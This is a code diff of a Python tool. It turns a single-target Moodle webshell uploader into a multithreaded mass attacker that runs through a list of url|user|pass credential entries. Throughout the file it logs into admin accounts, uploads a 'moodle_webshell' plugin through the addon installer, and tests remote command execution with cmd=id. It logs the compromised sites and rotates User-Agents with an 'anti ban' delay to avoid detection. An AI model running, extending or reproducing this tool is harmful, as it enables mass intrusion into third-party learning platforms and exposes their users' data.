@@ -1,88 +1,114 @@
-#!/usr/bin/env python3
-import requests
-import zipfile
-import os
-import argparse
-from bs4 import BeautifulSoup
+import requests, os, threading, argparse, time, random
+from urllib.parse import urljoin
+from queue import Queue
 
-def zip_plugin_folder(source_dir, output_zip):
-    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for root, dirs, files in os.walk(source_dir):
-            for file in files:
-                full_path = os.path.join(root, file)
-                rel_path = os.path.relpath(full_path, source_dir)
-                zf.write(full_path, arcname=os.path.join("moodle_webshell", rel_path))
-    print(f"[+] Plugin zipped: {output_zip}")
+lock = threading.Lock()
+q = Queue()
 
-def login(session, base_url, username, password):
-    login_url = f"{base_url}/login/index.php"
-    res = session.get(login_url, verify=False)
-    token = ""
-    soup = BeautifulSoup(res.text, "html.parser")
-    token_tag = soup.find("input", {"name": "logintoken"})
-    if token_tag:
-        token = token_tag.get("value")
+headers_list = [
+    {"User-Agent": "Mozilla/5.0"},
+    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
+]
 
-    data = {
-        "username": username,
-        "password": password,
-        "logintoken": token
-    }
-    response = session.post(login_url, data=data, verify=False)
-    return "dashboard" in response.url or "login/index.php" not in response.url
-
-def upload_plugin(session, base_url, zip_path):
-    upload_url = f"{base_url}/admin/tool/installaddon/index.php"
-    res = session.get(upload_url, verify=False)
-    soup = BeautifulSoup(res.text, "html.parser")
-    sesskey = soup.find("input", {"name": "sesskey"}).get("value")
-
-    with open(zip_path, 'rb') as f:
-        files = {
-            'repo_upload_file': (os.path.basename(zip_path), f, 'application/zip'),
-        }
+def login(session, login_url, username, password):
+    try:
+        r = session.get(login_url, timeout=15, headers=random.choice(headers_list), verify=False)
+        token = r.text.split('logintoken" value="')[1].split('"')[0]
         data = {
-            'title': '',
-            'itemid': '999999999',
-            'author': '',
-            'license': 'allrightsreserved',
-            'sesskey': sesskey,
-            'repo_id': 4,
-            'p': '',
-            'env': 'filemanager',
-            'action': 'upload'
+            "username": username,
+            "password": password,
+            "logintoken": token
         }
-        resp = session.post(f"{base_url}/repository/repository_ajax.php?action=upload", files=files, data=data, verify=False)
-        return resp.ok
+        r = session.post(login_url, data=data, headers=random.choice(headers_list), timeout=15, verify=False)
+        return "dashboard" in r.url or "loginsuccess" in r.text
+    except:
+        return False
+
+def upload_shell(session, base_url):
+    try:
+        upload_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
+        files = {
+            'repo_upload_file': ('moodle_webshell.zip', open('moodle_webshell.zip', 'rb'), 'application/zip')
+        }
+        session.get(upload_url, headers=random.choice(headers_list), timeout=15)
+        r = session.post(upload_url, files=files, headers=random.choice(headers_list), timeout=15)
+        return "Plugin installed" in r.text or "successfully installed" in r.text
+    except:
+        return False
+
+def exec_test(session, base_url):
+    try:
+        test_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
+        r = session.get(test_url, headers=random.choice(headers_list), timeout=15)
+        return "uid=" in r.text
+    except:
+        return False
+
+def process(target):
+    try:
+        url, user, pwd = target.strip().split("|")
+        base_url = url.split("/login")[0]
+        session = requests.Session()
+
+        result = []
+
+        if login(session, url, user, pwd):
+            result.append(f"1.Login success ✅ {url}|{user}|{pwd}")
+
+            if upload_shell(session, base_url):
+                shell_url = f"{base_url}/local/moodle_webshell/webshell.php"
+                result.append(f"2.Upload webshell ✅ {shell_url}")
+
+                access_url = f"{shell_url}?action=exec&cmd=id"
+                if exec_test(session, base_url):
+                    result.append(f"3.Access: {access_url}")
+                    result.append("4.Result: ✅ Webshell OK")
+                    save_result("success.txt", result)
+                else:
+                    result.append("3.Access Failed ❌")
+                    save_result("partial.txt", result)
+            else:
+                result.append("2.Upload Failed ❌")
+                result.append("3.No Webshell")
+                result.append("4.Only login success.")
+                save_result("only_login.txt", result)
+        else:
+            result.append(f"4.❌ Login Failed: {url}")
+            save_result("failed.txt", result)
+    except Exception as e:
+        save_result("error.txt", [f"[ERROR] {target} -> {str(e)}"])
+
+def save_result(filename, lines):
+    with lock:
+        with open(filename, "a") as f:
+            f.write("\n".join(lines) + "\n" + "-"*40 + "\n")
+
+def worker():
+    while not q.empty():
+        target = q.get()
+        process(target)
+        time.sleep(random.uniform(2, 5))  # anti ban
+        q.task_done()
 
 def main():
-    parser = argparse.ArgumentParser(description="Auto Moodle Webshell Uploader")
-    parser.add_argument('--url', required=True, help="Base URL of the Moodle site")
-    parser.add_argument('--user', required=True, help="Admin username")
-    parser.add_argument('--pass', required=True, help="Admin password")
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--list', help='File list target')
+    parser.add_argument('--thread', type=int, default=5)
     args = parser.parse_args()
 
-    plugin_folder = "moodle_webshell"
-    zip_file = "moodle_webshell.zip"
+    with open(args.list, 'r') as f:
+        for line in f:
+            q.put(line.strip())
 
-    if not os.path.exists(zip_file):
-        zip_plugin_folder(plugin_folder, zip_file)
+    threads = []
+    for _ in range(args.thread):
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
 
-    with requests.Session() as s:
-        s.headers.update({'User-Agent': 'Mozilla/5.0'})
-        try:
-            if login(s, args.url, args.user, args.pass):
-                print(f"[+] Login success ✅ {args.url}/login/index.php|{args.user}|{args.pass}")
-                if upload_plugin(s, args.url, zip_file):
-                    shell_url = f"{args.url}/local/moodle_webshell/webshell.php"
-                    print(f"[+] Upload webshell ✅ {shell_url}")
-                    print(f"[+] Access: {shell_url}?action=exec&cmd=id")
-                else:
-                    print("[-] Upload failed ❌")
-            else:
-                print(f"[-] {args.url} => Gagal login ❌")
-        except Exception as e:
-            print(f"[!] Error: {e}")
+    for t in threads:
+        t.join()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
